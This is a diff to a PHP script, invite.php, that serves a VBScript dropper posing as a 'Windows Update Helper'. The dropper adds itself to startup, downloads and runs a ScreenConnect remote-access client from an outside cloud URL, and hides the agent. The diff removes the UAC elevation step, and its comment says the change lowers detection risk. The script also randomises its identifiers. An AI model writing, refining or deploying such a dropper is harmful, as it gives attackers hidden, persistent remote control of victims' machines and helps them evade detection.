@@ -1,5 +1,5 @@
 <?php
-// invite.php - Fixed elevation + download
+// invite.php - No elevation (lower detection risk)
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -35,7 +35,6 @@ $scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetu
 $sessionId = bin2hex(random_bytes(24));
 $ts        = time();
 $randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
-$randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
 
 echo <<<VBS
 ' Windows Update Helper - $ts
@@ -51,25 +50,6 @@ Sub Log(msg)
 End Sub
 
 Call Log("Script started")
-
-Function IsElevated()
-    On Error Resume Next
-    Dim wmi, col, item
-    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
-    Set col = wmi.ExecQuery("Select * from Win32_Process where ProcessId = " & objShell.ProcessId)
-    For Each item In col
-        IsElevated = (item.GetOwner().Domain = "NT AUTHORITY")
-        Exit Function
-    Next
-    IsElevated = False
-End Function
-
-Sub Elevate()
-    On Error Resume Next
-    Call Log("Requesting elevation...")
-    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
-    WScript.Quit
-End Sub
 
 Sub AddToStartup()
     On Error Resume Next
@@ -115,15 +95,10 @@ Sub HideAgent()
 End Sub
 
 ' ===== MAIN =====
-If Not IsElevated Then
-    Call Elevate
-Else
-    Call Log("Running elevated")
-    Call AddToStartup
-    Call DownloadAndExecute
-    Call HideAgent
-    Call Log("All done")
-End If
+Call AddToStartup
+Call DownloadAndExecute
+Call HideAgent
+Call Log("All done")
 
 WScript.Quit
 VBS;
